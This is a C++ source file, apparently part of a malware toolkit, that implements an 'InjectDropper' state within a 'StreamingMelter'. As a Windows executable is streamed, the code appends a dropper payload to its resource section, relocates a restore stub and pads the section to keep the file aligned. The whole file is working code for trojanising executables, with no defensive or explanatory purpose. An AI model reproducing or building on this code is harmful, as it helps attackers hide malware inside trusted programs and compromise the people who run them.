/*
 * InjectDropper.cpp
 *
 *  Created on: May 7, 2010
 *      Author: daniele
 */

#include "Parsing.h"

void InjectDropper::init()
{
	// RCSDropper& dropper = context<StreamingMelter>().dropper();
	ImageSectionHeader& section = context<StreamingMelter>().resourceSection();
	neededBytes() = section->SizeOfRawData;
	triggeringOffset() = context<StreamingMelter>().currentOffset();
}

StateResult InjectDropper::parse()
{
	return PARSED;
}

StateResult InjectDropper::process()
{
	ImageSectionHeader& section = context<StreamingMelter>().resourceSection();
	context<StreamingMelter>().complete( section->SizeOfRawData );
	DBGTRACE_HEX("Sending resource data: ", (DWORD) section->SizeOfRawData, NOTIFY);

	// relocate restore stub with currentOffset
	Dropper& dropper = context<StreamingMelter>().dropper();
	dropper.restoreStub( context<StreamingMelter>().currentVA() );

	std::size_t dropperSize = dropper.size();
	context<StreamingMelter>().complete(dropper.data(), dropperSize);
	DBGTRACE_HEX("Injecting dropper size: ", (DWORD) dropperSize, NOTIFY);

	DWORD sentSectionSize = section->SizeOfRawData + dropperSize;
	DWORD fileAlignment = context<StreamingMelter>().fileAlignment();
	DWORD predictedSectionSize = alignTo(section->SizeOfRawData + dropperSize, fileAlignment);
	DBGTRACE_HEX("Predicted resource size: ", predictedSectionSize, NOTIFY);
	DWORD missingBytesToPredictedSize = predictedSectionSize - sentSectionSize;
	DBGTRACE_HEX("Missing bytes to predicted size: ", missingBytesToPredictedSize, NOTIFY);

	std::vector<char> padding(missingBytesToPredictedSize, 0);
	context<StreamingMelter>().complete( &padding[0], missingBytesToPredictedSize);
	DBGTRACE_HEX("Injecting padding size: ", (DWORD) missingBytesToPredictedSize, NOTIFY);

	offsetToNext() = currentOffset() + neededBytes();

	return PROCESSED;
}

sc::result InjectDropper::transitToNext()
{
	return transit< Defective >();
}

InjectDropper::InjectDropper()
	: DataState< InjectDropper, Parsing >()
{
	// TODO Auto-generated constructor stub

}

InjectDropper::~InjectDropper()
{
	// TODO Auto-generated destructor stub
}
